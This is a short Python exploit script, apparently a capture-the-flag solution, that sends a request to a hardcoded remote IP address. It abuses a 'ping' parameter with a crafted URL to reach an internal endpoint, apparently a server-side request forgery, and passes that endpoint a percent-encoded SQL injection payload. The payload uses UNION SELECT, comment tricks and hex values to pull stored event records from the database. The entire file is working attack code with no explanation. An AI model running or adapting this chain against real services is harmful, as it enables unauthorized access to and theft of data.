import requests 

url = "http://52.231.137.27:37221"
# url = "http://localhost:37221/"

x = b" union select 1\n.* from (select * from events "
x += b"union/**/select * from (select 1)a "
x += b"join (select 0x36646364346365323364383865326565393536386261353436633030376336336439313331633162)b "
x += b"join (select 0x36646364346365323364383865326565393536386261353436633030376336336439313331633162)c "
x += b"join (select body from events offset 1 rows fetch next 1 rows only)d offset 3 rows) XXX;-- -"

sql = ''
for i in range(len(x)):
    sql += '%%%02x' % (x[i])

r = requests.get(
    f"{url}", 
    params={
        "action": "ping",
        "arg": f"http://localhost:80\@.cce.cstec.kr|?action=db_show_event_detail&db_arg_event_name={sql}&db_arg_writer=A&db_arg_password=A",
    }
)
print(r.text)
